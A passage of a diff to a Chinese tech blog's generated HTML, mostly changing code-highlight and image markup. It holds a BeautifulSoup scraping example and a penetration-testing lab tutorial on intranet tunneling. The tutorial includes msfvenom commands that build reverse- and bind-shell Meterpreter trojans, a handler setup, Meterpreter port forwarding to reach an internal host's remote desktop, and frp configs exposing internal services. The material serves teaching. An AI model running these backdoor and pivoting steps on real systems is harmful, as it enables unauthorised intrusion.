</span><br><span class="line">  </span><br><span class="line">titles = html.find_all(class_=<span class="string">&#x27;title&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(titles)  </span><br><span class="line">  </span><br><span class="line">title = html.find(text=<span class="string">&#x27;揭秘：带你了解学员眼中真实的阿多比！&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(title)  </span><br><span class="line"><span class="built_in">print</span>(title.parent)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 根据kpath的风格进行查找//div@class=&#x27;title&#x27;]  </span></span><br><span class="line">titles = html.find_all(<span class="string">&#x27;div&#x27;</span>, &#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;title&#x27;</span>&#125;)  </span><br><span class="line"><span class="keyword">for</span> title <span class="keyword">in</span> titles:  </span><br><span class="line">    <span class="built_in">print</span>(title.string)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># CSS选择器  </span></span><br><span class="line">titles = html.select(<span class="string">&#x27;div.title&#x27;</span>)  </span><br><span class="line"><span class="keyword">for</span> title <span class="keyword">in</span> titles:  </span><br><span class="line">    <span class="built_in">print</span>(title.string)  </span><br><span class="line">  </span><br><span class="line">keyword = html.select(<span class="string">&#x27;#keyword&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(keyword[<span class="number">0</span>][<span class="string">&#x27;placeholder&#x27;</span>])  </span><br><span class="line">lis = html.select(<span class="string">&#x27;ul li&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(lis)</span><br></pre></td></tr></table></figure></div>
+<h4 id="2、代码实现"><a href="#2、代码实现" class="headerlink" title="2、代码实现"></a>2、代码实现</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup  <br>  <br>resp = requests.get(<span class="hljs-string">&#x27;&#x27;</span>)  <br>  <br><span class="hljs-comment"># 初始化解析器  </span><br>html = BeautifulSoup(resp.text, <span class="hljs-string">&#x27;lxml&#x27;</span>)  <br><span class="hljs-comment"># 查找页面元素(根据标签层次进行查找)  </span><br><span class="hljs-built_in">print</span>(html.head.title)  <span class="hljs-comment"># 根据标签的层次找页面标题  </span><br><span class="hljs-built_in">print</span>(html.head.title.string)  <span class="hljs-comment"># 获取页面标题的文本内容  </span><br><span class="hljs-built_in">print</span>(html.div)  <span class="hljs-comment"># 查找页面中的第一个DIV元素  </span><br>  <br><span class="hljs-comment"># 查找页面元素的通用方法：  </span><br><span class="hljs-comment"># 1、find all:根据标签，属性，XPath等进行查找  </span><br><span class="hljs-comment"># 2、select:CSS选择器，div,#id,.class  </span><br>  <br><span class="hljs-comment"># 查找页面所有超链接  </span><br>links = html.find_all(<span class="hljs-string">&#x27;a&#x27;</span>)  <br><span class="hljs-keyword">for</span> link <span class="hljs-keyword">in</span> links:  <br>    <span class="hljs-built_in">print</span>(link[<span class="hljs-string">&#x27;href&#x27;</span>])  <br>  <br><span class="hljs-comment"># 查找页面的图片  </span><br>images = html.find_all(<span class="hljs-string">&#x27;img&#x27;</span>)  <br><span class="hljs-keyword">for</span> image <span class="hljs-keyword">in</span> images:  <br>    <span class="hljs-built_in">print</span>(image[<span class="hljs-string">&#x27;src&#x27;</span>])  <br>  <br><span class="hljs-comment"># 根据id或class等属性查找  </span><br>keyword = html.find(<span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;keyword&#x27;</span>)  <br><span class="hljs-built_in">print</span>(keyword[<span class="hljs-string">&#x27;placeholder&#x27;</span>])  <br>  <br>titles = html.find_all(class_=<span class="hljs-string">&#x27;title&#x27;</span>)  <br><span class="hljs-built_in">print</span>(titles)  <br>  <br>title = html.find(text=<span class="hljs-string">&#x27;揭秘：带你了解学员眼中真实的阿多比！&#x27;</span>)  <br><span class="hljs-built_in">print</span>(title)  <br><span class="hljs-built_in">print</span>(title.parent)  <br>  <br><span class="hljs-comment"># 根据kpath的风格进行查找//div@class=&#x27;title&#x27;]  </span><br>titles = html.find_all(<span class="hljs-string">&#x27;div&#x27;</span>, &#123;<span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;title&#x27;</span>&#125;)  <br><span class="hljs-keyword">for</span> title <span class="hljs-keyword">in</span> titles:  <br>    <span class="hljs-built_in">print</span>(title.string)  <br>  <br><span class="hljs-comment"># CSS选择器  </span><br>titles = html.select(<span class="hljs-string">&#x27;div.title&#x27;</span>)  <br><span class="hljs-keyword">for</span> title <span class="hljs-keyword">in</span> titles:  <br>    <span class="hljs-built_in">print</span>(title.string)  <br>  <br>keyword = html.select(<span class="hljs-string">&#x27;#keyword&#x27;</span>)  <br><span class="hljs-built_in">print</span>(keyword[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;placeholder&#x27;</span>])  <br>lis = html.select(<span class="hljs-string">&#x27;ul li&#x27;</span>)  <br><span class="hljs-built_in">print</span>(lis)<br></code></pre></td></tr></table></figure>
 
-<h4 id="3、参考资料"><a href="#3、参考资料" class="headerlink" title="3、参考资料"></a>3、参考资料</h4><p><a class="link"   href="https://blog.csdn.net/KOBEYU652453/article/details/113189859" >https://blog.csdn.net/KOBEYU652453/article/details/113189859 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/" >https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.cnblogs.com/Yiutto/p/5387021.html" >https://www.cnblogs.com/Yiutto/p/5387021.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h4 id="3、参考资料"><a href="#3、参考资料" class="headerlink" title="3、参考资料"></a>3、参考资料</h4><p><a href="https://blog.csdn.net/KOBEYU652453/article/details/113189859">https://blog.csdn.net/KOBEYU652453/article/details/113189859</a><br><a href="https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/">https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/</a><br><a href="https://www.cnblogs.com/Yiutto/p/5387021.html">https://www.cnblogs.com/Yiutto/p/5387021.html</a></p>
 ]]></content>
       <categories>
         <category>python</category>
@@ -183,117 +168,67 @@
 <p>（3）应用层隧道：应用层位于TCP&#x2F;IP协议的最顶层，通常用于搭建各种应用服务，而基于应用层搭建的隧道技术就是利用各种应用所占用的端口进行塔建，比如有SSH、HTTP&#x2F;HTTPS和DNS服务，这些服务是服务器经常用到不会被禁止的协议。</p>
 <h2 id="3、各类工具"><a href="#3、各类工具" class="headerlink" title="3、各类工具"></a>3、各类工具</h2><p>如Windows自带的netsh命令、MSF、CS、Neo-reGeorg、proxychains、profiler、PowerCat、netcat、Tunna、frp、EarthWorm等。</p>
 <h1 id="二、构建实验环境"><a href="#二、构建实验环境" class="headerlink" title="二、构建实验环境"></a>二、构建实验环境</h1><h2 id="1、网络构成"><a href="#1、网络构成" class="headerlink" title="1、网络构成"></a>1、网络构成</h2><p>(1)攻击主机：Kai,IP地址：192.168.112.148<br>(2)代理主机：Windows2016,IP地址：192.168.112.160,10.10.10.128<br>(3)内网主机：Windows7,IP地址：10.10.10.129</p>
-<p>Kali可以与Windows2016通信，不能与Windows7通信，Windows2016可以与Windows7通信。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/b91e23bec64ad1d45a15d13a9b5c5cc6.png"
-                      alt="b91e23bec64ad1d45a15d13a9b5c5cc6.png"
-                ></p>
-<p>2、修改VMWare网络设置<br>将VMnet1仅主机模式的lP地址修改为：10.10.10.0，本机默认为192.168.119.0，为了显著区分HostOnly与NAT的IP地址差异而进行的修改，当然，也可以不修改，保持192.168.119.0网段。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/8856189c3fabca1c47002dc267813d9c.png"
-                      alt="8856189c3fabca1c47002dc267813d9c.png"  
-                ></p>
+<p>Kali可以与Windows2016通信，不能与Windows7通信，Windows2016可以与Windows7通信。<br><img src="https://blog.pppfz.com/assets/b91e23bec64ad1d45a15d13a9b5c5cc6.png" alt="b91e23bec64ad1d45a15d13a9b5c5cc6.png"></p>
+<p>2、修改VMWare网络设置<br>将VMnet1仅主机模式的lP地址修改为：10.10.10.0，本机默认为192.168.119.0，为了显著区分HostOnly与NAT的IP地址差异而进行的修改，当然，也可以不修改，保持192.168.119.0网段。<br><img src="https://blog.pppfz.com/assets/8856189c3fabca1c47002dc267813d9c.png" alt="8856189c3fabca1c47002dc267813d9c.png"  /></p>
 <p>在安装有Python的环境中，如果需要临时启动一个HTTP服务器用于测试，可以直接运行命令：<code>python-m http.server</code></p>
-<h2 id="2、配置补充知识"><a href="#2、配置补充知识" class="headerlink" title="2、配置补充知识"></a>2、配置补充知识</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/403513377" >搞懂虚拟机VirtualBox网络配置 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="2、配置补充知识"><a href="#2、配置补充知识" class="headerlink" title="2、配置补充知识"></a>2、配置补充知识</h2><p><a href="https://zhuanlan.zhihu.com/p/403513377">搞懂虚拟机VirtualBox网络配置 - 知乎 (zhihu.com)</a></p>
 <ul>
 <li>桥接：直接等同于又开了一台独立主机，向网关请求IP（于主机同一网段）</li>
 <li>NAT：与主机公用一个IP（请求网关），独立一套IP网段用于虚拟机间连接。（对于网关来说，就一个IP地址请求它）</li>
-<li>host-noly：独立一套IP网段用于虚拟机间连接，只有主机能够通过虚拟网卡连接。里面不能访问外边（也可以配置，但麻烦<a class="link"   href="https://www.linuxidc.com/Linux/2016-09/135521p3.htm" >Host-Only（仅主机模式） - VMware虚拟机三种网络模式详解_Linux教程_Linux公社-Linux系统门户网站 (linuxidc.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）</li>
+<li>host-noly：独立一套IP网段用于虚拟机间连接，只有主机能够通过虚拟网卡连接。里面不能访问外边（也可以配置，但麻烦<a href="https://www.linuxidc.com/Linux/2016-09/135521p3.htm">Host-Only（仅主机模式） - VMware虚拟机三种网络模式详解_Linux教程_Linux公社-Linux系统门户网站 (linuxidc.com)</a>）</li>
 </ul>
 <h1 id="三、内网穿透-端口转发"><a href="#三、内网穿透-端口转发" class="headerlink" title="三、内网穿透-端口转发"></a>三、内网穿透-端口转发</h1><h2 id="使用netsh进行端口转发"><a href="#使用netsh进行端口转发" class="headerlink" title="使用netsh进行端口转发"></a>使用netsh进行端口转发</h2><h3 id="1、配置端口转发"><a href="#1、配置端口转发" class="headerlink" title="1、配置端口转发"></a>1、配置端口转发</h3><p>(1)先在Windows7上启动一个Xampp的服务(80端口)，或者其他服务。<br>(2)在Windows2016服务器上，运行以下命令，完成端口转发。</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=8888 connectaddress=10.10.10.129 connectport=80</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netsh interface portproxy add v4tov4 listenport=8888 connectaddress=10.10.10.129 connectport=80<br></code></pre></td></tr></table></figure>
 
-<h3 id="2、测试端口转发"><a href="#2、测试端口转发" class="headerlink" title="2、测试端口转发"></a>2、测试端口转发</h3><p>(1)在Kali上访问http:&#x2F;192.1682.160:8888&#x2F;dashboard&#x2F;phpinfo.php,PHPINFO显示这是一台Windows7的主机，端口转发成功。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/885f1ec634d86eecaf1adf43e1c09cea.png"
-                      alt="885f1ec634d86eecaf1adf43e1c09cea.png"
-                ></p>
+<h3 id="2、测试端口转发"><a href="#2、测试端口转发" class="headerlink" title="2、测试端口转发"></a>2、测试端口转发</h3><p>(1)在Kali上访问http:&#x2F;192.1682.160:8888&#x2F;dashboard&#x2F;phpinfo.php,PHPINFO显示这是一台Windows7的主机，端口转发成功。<br><img src="https://blog.pppfz.com/assets/885f1ec634d86eecaf1adf43e1c09cea.png" alt="885f1ec634d86eecaf1adf43e1c09cea.png"></p>
 <p>(2)在Windows2016上，运行以下命令可以查看端口转发列表。</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netsh interface portproxy show all<br></code></pre></td></tr></table></figure>
 
-<p>(3)此时，在Windows2016的服务器上，直接可以使用localhost进行访问。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/797401510488e421eb73e7989a23fe6f.png"
-                      alt="797401510488e421eb73e7989a23fe6f.png"
-                ></p>
-<h3 id="3、清除转发规则"><a href="#3、清除转发规则" class="headerlink" title="3、清除转发规则"></a>3、清除转发规则</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=8888</span><br><span class="line">netsh interface portproxy reset</span><br></pre></td></tr></table></figure></div>
+<p>(3)此时，在Windows2016的服务器上，直接可以使用localhost进行访问。<br><img src="https://blog.pppfz.com/assets/797401510488e421eb73e7989a23fe6f.png" alt="797401510488e421eb73e7989a23fe6f.png"></p>
+<h3 id="3、清除转发规则"><a href="#3、清除转发规则" class="headerlink" title="3、清除转发规则"></a>3、清除转发规则</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netsh interface portproxy delete v4tov4 listenport=8888<br>netsh interface portproxy reset<br></code></pre></td></tr></table></figure>
 
-<p>如果Windows2016的防火墙限制了8888的端口访问，则此时端口转发将无法生效，所以，还需要寻找更多解决方案。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/a0fa9c768540bdb30d00a41590e9ff10.png"
-                      alt="利用管理员权限开启端口"
-                ></p>
-<h3 id="4、Linux上的端口转发"><a href="#4、Linux上的端口转发" class="headerlink" title="4、Linux上的端口转发"></a>4、Linux上的端口转发</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -d 192.168.112.153 -p tcp --dport 8088 -j SNAT --to 192.168.112.188</span><br><span class="line">firewall-cmd --add-forward-port=port=8888:proto=tcp:toaddr=101.37.65.91:toport=80</span><br></pre></td></tr></table></figure></div>
+<p>如果Windows2016的防火墙限制了8888的端口访问，则此时端口转发将无法生效，所以，还需要寻找更多解决方案。<br><img src="https://blog.pppfz.com/assets/a0fa9c768540bdb30d00a41590e9ff10.png" alt="利用管理员权限开启端口"></p>
+<h3 id="4、Linux上的端口转发"><a href="#4、Linux上的端口转发" class="headerlink" title="4、Linux上的端口转发"></a>4、Linux上的端口转发</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">iptables -t nat -A POSTROUTING -d 192.168.112.153 -p tcp --dport 8088 -j SNAT --to 192.168.112.188<br>firewall-cmd --add-forward-port=port=8888:proto=tcp:toaddr=101.37.65.91:toport=80<br></code></pre></td></tr></table></figure>
 
-<h2 id="使用Meterpreter进行端口转发"><a href="#使用Meterpreter进行端口转发" class="headerlink" title="使用Meterpreter进行端口转发"></a>使用Meterpreter进行端口转发</h2><h3 id="1、为代理主机生成木马"><a href="#1、为代理主机生成木马" class="headerlink" title="1、为代理主机生成木马"></a>1、为代理主机生成木马</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.112.148 LPORT=4444 -f exe -o shell.exe</span><br></pre></td></tr></table></figure></div>
+<h2 id="使用Meterpreter进行端口转发"><a href="#使用Meterpreter进行端口转发" class="headerlink" title="使用Meterpreter进行端口转发"></a>使用Meterpreter进行端口转发</h2><h3 id="1、为代理主机生成木马"><a href="#1、为代理主机生成木马" class="headerlink" title="1、为代理主机生成木马"></a>1、为代理主机生成木马</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.112.148 LPORT=4444 -f exe -o shell.exe<br></code></pre></td></tr></table></figure>
 
 <p>将上述木马运行于Windows2016服务器上，获取到Meterprter反弹连接。</p>
-<h3 id="2、为代理主机配置端口转发"><a href="#2、为代理主机配置端口转发" class="headerlink" title="2、为代理主机配置端口转发"></a>2、为代理主机配置端口转发</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.112.148</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在Windows2016上启动木马，获取Meterpreter,然后配置端口转发参数给Windows2016</span></span><br><span class="line">meterpreter portfwd add -l 8889 -r 10.10.10.129 -p 80</span><br><span class="line">[*]Loca1 TCP relay created::8889 &lt;-&gt; 10.10.10.129:80</span><br></pre></td></tr></table></figure></div>
+<h3 id="2、为代理主机配置端口转发"><a href="#2、为代理主机配置端口转发" class="headerlink" title="2、为代理主机配置端口转发"></a>2、为代理主机配置端口转发</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.112.148<br>set lport 4444<br>run<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">在Windows2016上启动木马，获取Meterpreter,然后配置端口转发参数给Windows2016</span><br>meterpreter portfwd add -l 8889 -r 10.10.10.129 -p 80<br>[*]Loca1 TCP relay created::8889 &lt;-&gt; 10.10.10.129:80<br></code></pre></td></tr></table></figure>
 
-<h3 id="3、在Kali上直接访问localhost-8889"><a href="#3、在Kali上直接访问localhost-8889" class="headerlink" title="3、在Kali上直接访问localhost:8889"></a>3、在Kali上直接访问localhost:8889</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/859222b8f9253427a70e093478eda6ca.png"
-                      alt="859222b8f9253427a70e093478eda6ca.png"
-                ></p>
-<h3 id="4、在Kali上访问Windows7的远程桌面"><a href="#4、在Kali上访问Windows7的远程桌面" class="headerlink" title="4、在Kali上访问Windows7的远程桌面"></a>4、在Kali上访问Windows7的远程桌面</h3><p>(1)先确保Windows7的远程桌面服务已经启动。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/a7da71445febad4458a2ae4d927a119a.png"
-                      alt="a7da71445febad4458a2ae4d927a119a.png"
-                ></p>
+<h3 id="3、在Kali上直接访问localhost-8889"><a href="#3、在Kali上直接访问localhost-8889" class="headerlink" title="3、在Kali上直接访问localhost:8889"></a>3、在Kali上直接访问localhost:8889</h3><p><img src="https://blog.pppfz.com/assets/859222b8f9253427a70e093478eda6ca.png" alt="859222b8f9253427a70e093478eda6ca.png"></p>
+<h3 id="4、在Kali上访问Windows7的远程桌面"><a href="#4、在Kali上访问Windows7的远程桌面" class="headerlink" title="4、在Kali上访问Windows7的远程桌面"></a>4、在Kali上访问Windows7的远程桌面</h3><p>(1)先确保Windows7的远程桌面服务已经启动。<br><img src="https://blog.pppfz.com/assets/a7da71445febad4458a2ae4d927a119a.png" alt="a7da71445febad4458a2ae4d927a119a.png"></p>
 <p>(2)在Meterpreter中执行命令：</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 8839 -r 10.10.10.129 -p 3389</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">meterpreter &gt; portfwd add -l 8839 -r 10.10.10.129 -p 3389<br></code></pre></td></tr></table></figure>
 
-<p>(3)在Kali（不是meterpreter）中运行命令：<code>rdesktop 127.0.0.1:8839</code> 完成远程桌面访问。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/a5454b4451b41b1fc5175d9f07ed4dff.png"
-                      alt="a5454b4451b41b1fc5175d9f07ed4dff.png"
-                ></p>
+<p>(3)在Kali（不是meterpreter）中运行命令：<code>rdesktop 127.0.0.1:8839</code> 完成远程桌面访问。<br><img src="https://blog.pppfz.com/assets/a5454b4451b41b1fc5175d9f07ed4dff.png" alt="a5454b4451b41b1fc5175d9f07ed4dff.png"></p>
 <p>(4)以类似的方式，也可以直接将Windows2016的3389端口转发到Kli本地，实现对代理主机的远程访问。</p>
-<h2 id="使用Meterpreter实现正向连接"><a href="#使用Meterpreter实现正向连接" class="headerlink" title="使用Meterpreter实现正向连接"></a>使用Meterpreter实现正向连接</h2><h3 id="1、生成正向后门"><a href="#1、生成正向后门" class="headerlink" title="1、生成正向后门"></a>1、生成正向后门</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -f exe -o shell.exe</span><br></pre></td></tr></table></figure></div>
+<h2 id="使用Meterpreter实现正向连接"><a href="#使用Meterpreter实现正向连接" class="headerlink" title="使用Meterpreter实现正向连接"></a>使用Meterpreter实现正向连接</h2><h3 id="1、生成正向后门"><a href="#1、生成正向后门" class="headerlink" title="1、生成正向后门"></a>1、生成正向后门</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/bind_tcp -f exe -o shell.exe<br></code></pre></td></tr></table></figure>
 
-<h3 id="2、运行以下指令完成正向连接"><a href="#2、运行以下指令完成正向连接" class="headerlink" title="2、运行以下指令完成正向连接"></a>2、运行以下指令完成正向连接</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set lport 4444</span><br><span class="line">set rhost 192.168.112.160</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+<h3 id="2、运行以下指令完成正向连接"><a href="#2、运行以下指令完成正向连接" class="headerlink" title="2、运行以下指令完成正向连接"></a>2、运行以下指令完成正向连接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use exploit/multi/handler<br>set payload windows/meterpreter/bind_tcp<br>set lport 4444<br>set rhost 192.168.112.160<br>run<br></code></pre></td></tr></table></figure>
 
 <h1 id="四、内网穿透-端口映射"><a href="#四、内网穿透-端口映射" class="headerlink" title="四、内网穿透-端口映射"></a>四、内网穿透-端口映射</h1><h2 id="使用frp进行端口映射"><a href="#使用frp进行端口映射" class="headerlink" title="使用frp进行端口映射"></a>使用frp进行端口映射</h2><h3 id="1、SSH服务"><a href="#1、SSH服务" class="headerlink" title="1、SSH服务"></a>1、SSH服务</h3><p>(1)在公网服务器上，配置<code>frps.ini</code>，并使用<code>./frps -c ./frps.ini</code>命令启动</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000  	# frp服务端端口（必须）</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span>  	<span class="hljs-comment"># frp服务端端口（必须）</span><br></code></pre></td></tr></table></figure>
 
 <blockquote>
 <p>后台启动：$ nohup.&#x2F;frps-c frps.ini &amp;</p>
 </blockquote>
 <p>(2)配置内网客户端frpc.ini</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 47.96.116.171		# frp服务端地址，可以填ip或者域名，这里假设为0.0.0.0</span><br><span class="line">server_port = 7000		# frp服务端端口，即填写服务端配置中的bind_port</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type = tcp		# 连接类型，填tcp或udp</span><br><span class="line">local_ip = 127.0.0.1	# 填127.0.0.1或内网ip都可以</span><br><span class="line">local_port = 22		# 需要转发到的端口，ssh端口是22</span><br><span class="line">remote_port = 8082		# frp服务端的远程监听端口，即你访问服务端的remote_port就相当于访问客户端的local_port,如果填0则会随机分配一个端口，而7000的端口是对外显示的（隐藏真实的端口关系？）</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">47.96</span>.<span class="hljs-number">116.171</span>		<span class="hljs-comment"># frp服务端地址，可以填ip或者域名，这里假设为0.0.0.0</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>		<span class="hljs-comment"># frp服务端端口，即填写服务端配置中的bind_port</span><br><br><span class="hljs-section">[ssh]</span><br><span class="hljs-attr">type</span> = tcp		<span class="hljs-comment"># 连接类型，填tcp或udp</span><br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>	<span class="hljs-comment"># 填127.0.0.1或内网ip都可以</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">22</span>		<span class="hljs-comment"># 需要转发到的端口，ssh端口是22</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">8082</span>		<span class="hljs-comment"># frp服务端的远程监听端口，即你访问服务端的remote_port就相当于访问客户端的local_port,如果填0则会随机分配一个端口，而7000的端口是对外显示的（隐藏真实的端口关系？）</span><br></code></pre></td></tr></table></figure>
 
 <p>(3)在任意其他主机上，使用“<code>ssh -p 8082 root@47.96.116.171</code>“直接可以访问到内网Linux。</p>
 <h3 id="2、HTTP服务"><a href="#2、HTTP服务" class="headerlink" title="2、HTTP服务"></a>2、HTTP服务</h3><p>(1)在公网服务器上，配置<code>frps.ini</code>，并使用<code>./frps-c./frps.ini</code>命令启动</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">vhost_http_port = 8080</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">vhost_http_port</span> = <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>
 
-<p>(2)在为公网IP配置域名解析<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/8b255818a2441bd8ce9aeea99c1e5921.png"
-                      alt="8b255818a2441bd8ce9aeea99c1e5921.png"
-                ></p>
+<p>(2)在为公网IP配置域名解析<br><img src="https://blog.pppfz.com/assets/8b255818a2441bd8ce9aeea99c1e5921.png" alt="8b255818a2441bd8ce9aeea99c1e5921.png"></p>
 <p>(3)确认云服务器防火墙规则</p>
 <p>(4)在Windows2016上启动<code>frpc.exe -c frpc.ini</code></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 47.96.116.171</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">local_port = 80</span><br><span class="line">custom_domains = frp.matrika.cn</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">47.96</span>.<span class="hljs-number">116.171</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-section">[web]</span><br><span class="hljs-attr">type</span> = http<br><span class="hljs-attr">local_port</span> = <span class="hljs-number">80</span><br><span class="hljs-attr">custom_domains</span> = frp.matrika.cn<br></code></pre></td></tr></table></figure>
 
 <h3 id="3、开启Dashboard"><a href="#3、开启Dashboard" class="headerlink" title="3、开启Dashboard"></a>3、开启Dashboard</h3><p>编辑服务器端frps.ini</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">vhost_http_port = 8080</span><br><span class="line"></span><br><span class="line">dashboard_port =8081		</span><br><span class="line"># 注意端口要经过公网防火墙配置（注意不能包含在真正的配置文件中）</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = 123456</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">vhost_http_port</span> = <span class="hljs-number">8080</span><br><br><span class="hljs-attr">dashboard_port</span> =<span class="hljs-number">8081</span>		<br><span class="hljs-comment"># 注意端口要经过公网防火墙配置（注意不能包含在真正的配置文件中）</span><br><span class="hljs-attr">dashboard_user</span> = admin<br><span class="hljs-attr">dashboard_pwd</span> = <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
 
-<p>访问：<a href="http://4796.116.171:8081/static/#/">http://4796.116.171:8081/static/#/</a> ,输入用户名和密码<br><img  
-                     lazyload
-                     src="/images/loading.svg"
